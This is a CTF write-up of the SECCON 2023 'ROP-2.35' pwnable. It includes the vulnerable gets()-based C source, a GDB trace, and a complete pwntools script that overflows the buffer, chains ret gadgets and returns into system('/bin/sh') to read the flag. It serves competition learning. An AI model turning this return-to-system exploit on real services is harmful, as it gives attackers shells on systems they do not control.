---
toc: true
title: SECCON CTF 2023 Quals
description: 'Did not have much time to go hard on this one, but I do solve a few challenges'
date: 2023-09-16
author: Duc Anh Nguyen
---

Did not have time to go in hard with this CTF, but I did try to touch on the **pwnable** challenges as much as possible.
> Click the heading of each challenges to get source files.

## [**Pwnable**](https://github.com/heckintosh/CTF-Writeups/tree/main/SECCON)
This is how pwnable challenges should be made, just give the source code instead of making everyone turn on Ghidra.
### [ROP-2.35](https://github.com/heckintosh/CTF-Writeups/tree/main/SECCON/rop-2.35/published)
For beginner this challenge has some annoying steps that will make you mentally ill.

`main.c` is the source code provided:
```c
#include <stdio.h>
#include <stdlib.h>

void main() {
  char buf[0x10];
  system("echo Enter something:");
  gets(buf);
}
```

GDB output:
```asm
0x0000000000401156 <+0>:     endbr64
0x000000000040115a <+4>:     push   rbp
0x000000000040115b <+5>:     mov    rbp,rsp
0x000000000040115e <+8>:     sub    rsp,0x10
0x0000000000401162 <+12>:    lea    rax,[rip+0xe9b]        # 0x402004
0x0000000000401169 <+19>:    mov    rdi,rax
0x000000000040116c <+22>:    call   0x401050 <system@plt>
0x0000000000401171 <+27>:    lea    rax,[rbp-0x10]
0x0000000000401175 <+31>:    mov    rdi,rax
0x0000000000401178 <+34>:    mov    eax,0x0
0x000000000040117d <+39>:    call   0x401060 <gets@plt>
0x0000000000401182 <+44>:    nop
0x0000000000401183 <+45>:    leave
0x0000000000401184 <+46>:    ret
```


Set a breakpoint at `*main+39`. When we continue, it will not hit a breakpoint but output this.
```
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Attaching after Thread 0x7ffff7dc4740 (LWP 80425) vfork to child process 80428]
[New inferior 2 (process 80428)]
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching vfork parent process 80425 after child exec]
[Inferior 1 (process 80425) detached]
process 80428 is executing new program: /usr/bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "main" in current context.
Error in re-setting breakpoint 1: No symbol "main" in current context.
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Error in re-setting breakpoint 1: No symbol "main" in current contex
```

That is because the system call is actually creating child process and for some reasons my gdb chooses to follow the child and abandon the parent ***(bruh)*** as default. Stop this dodgy behavior through `set follow-fork-mode parent`.

We can overflow the buffer to overwrite the address when main returns with gets. Do your cyclic stuff to find the offset (search if you don't know what this is).
The question now is to return where. There is no `put@plt` in this binary so leaking libc base address is out of the question. NX is enabled and the buffer length is 16 bytes so I ain't doing shellcode. Notice that when main returns, rax contains the address of the buffer.

`*RAX  0x7fffffffddd0 ◂— 'somerandomvalue'`

And `gets` write our payload into the buffer at rax. There is a `mov rdi, rax` just before system is called. So we will be returning there after overflowing. Now `rdi` contains the value of our payload and system will use the value in `rdi` register as its argument. We can now execute *`system(payload)`*! Or can we?

When you debug this, after sending the payload, it can be seen that system is loading our payload as its arguments. It actually works in my Kali environment but it gives me this when exploiting remotely:

**`sh: 1: V\x11@ not found`**

Well this challenge's binary is built with libc-2.35 (hint: in title). So use [pwninit](https://github.com/io12/pwninit) to patch the binary with the libc-2.35 extracted from Ubuntu 22.04 docker (it is provided in the Dockerfile). It behaves exactly the same as the remote binary. Debugging the binary, it turns out that even though GDB shows that system is loading our command, it is pushing a bunch registers which leads to junk in the system argument. So we get rid of them gradually with `ret` gadget so that system loads our `/bin/sh\0` payload.

```python
# solve.py
from pwn import *

libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
context.arch = 'amd64'
pty = process.PTY
is_local = False

elf = ELF("/home/kali/CTF/SECCON/rop-2.35/chall_patched")
if len(sys.argv) == 1:
    is_local = True
    p = process(elf.path, stdin=pty, stdout=pty)

elif len(sys.argv) > 1:
    #  nc rop-2-35.seccon.games 9999
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

debug(cmd='''
        set follow-fork-mode parent
        b *main + 46
      ''')

offset = 24
system_address = elf.symbols["system"]

log.info("System plt: " + hex(system_address))
print(p.recvuntilS("Enter something:\n"))


payload = b"/bin/sh\0\0" + b"/bin/p" + b"/bin/pwd\0"
payload += p64(0x000000000040101a)
payload += p64(0x000000000040101a)
payload += p64(0x000000000040101a)
payload += p64(0x000000000040101a)
payload += p64(0x0000000000401169)
p.sendline(payload)
p.sendline("cat /flag*")
p.interactive()
```

### 2. Kmemo